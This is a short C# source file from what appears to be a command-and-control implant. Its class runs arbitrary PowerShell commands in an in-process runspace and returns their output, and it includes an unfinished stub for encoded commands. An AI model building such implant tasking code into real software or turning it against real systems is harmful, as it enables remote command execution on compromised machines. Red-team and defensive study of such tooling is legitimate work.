using System;
using System.Collections.ObjectModel;
using System.Linq;
using System.Management.Automation;
using System.Text;

namespace Implant.Tasks.Execute
{
    class PSShellFunctions
    {
        public static bool Encoded { get; set; }
        public static StringBuilder _out = new StringBuilder();

        // drop into PS session
        // create a PS instance and return as obj
        public static PowerShell CreateInstance()
        {
            PowerShell ps = PowerShell.Create();
            return ps;
        }

        // send cmd to execute to obj created from CreateInstance, pass result to WriteOutput
        public static string Execute(PowerShell ps, string cmd)
        {
            PowerShell PSCmd = ps.AddScript(cmd);

            Collection<PSObject> _out = null;
            try
            {
                _out = PSCmd.Invoke();
            }
            catch (Exception e) { return $"Error occured: {e.Message}"; }

            StringBuilder out_stream = new StringBuilder();

            foreach (PSObject obj in _out)
            {
                if (obj.ToString().Contains(';')) { out_stream.AppendLine(obj.ToString().Replace(';', '\n')); }
                else { out_stream.AppendLine(obj.ToString()); }
            }

            return out_stream.ToString().Trim('\n');
        }

        
        public static string ReturnEncodedCmd(PowerShell ps, string cmd){
            // send cmd to execute to obj created from CreateInstance using encoded flag, pass result to WriteOutput
            return "";
        }
        


    }
}
